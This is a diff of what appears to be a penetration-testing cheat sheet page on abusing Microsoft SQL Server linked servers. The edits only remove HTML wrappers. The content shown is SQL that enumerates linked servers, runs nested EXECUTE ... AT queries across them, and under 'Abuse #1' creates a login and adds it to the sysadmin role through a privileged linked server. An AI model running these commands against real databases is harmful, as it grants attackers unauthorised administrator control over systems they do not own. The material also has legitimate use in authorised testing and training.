@@ -8,8 +8,6 @@ tags: ["mssql", "database", "Windows", "linked_server", "privesc"]
 
 <small>*Hint: Use double '' to escape ' in mssql*</small>
 
-<div>
-
 ```console
 # Show current server
 select @@servername
@@ -25,11 +23,7 @@ select srvname from sysservers;
 enum_links
 ```
 
-</div>
-
 ### Execute Query between Linked Servers
-
-<div>
 
 ```console
 # Execute query from current server to linked server
@@ -41,15 +35,9 @@ EXECUTE ('select @@version;') at [<LINKED_SERVER>];
 EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [<CURRENT_SERVER>]') at [<LINKED_SERVER>];
 ```
 
-</div>
-
-<br>
-
 ---
 
 ### Abuse #1: Create Admin User from Privilege Linked Server
-
-<div>
 
 ```console
 EXECUTE('EXECUTE(''CREATE LOGIN <USER> WITH PASSWORD = ''''<PASSWORD>'''';'') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]
@@ -58,5 +46,3 @@ EXECUTE('EXECUTE(''CREATE LOGIN <USER> WITH PASSWORD = ''''<PASSWORD>'''';'') AT
 ```console
 EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''<USER>'''', ''''sysadmin'''''') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]
 ```
-
-</div>
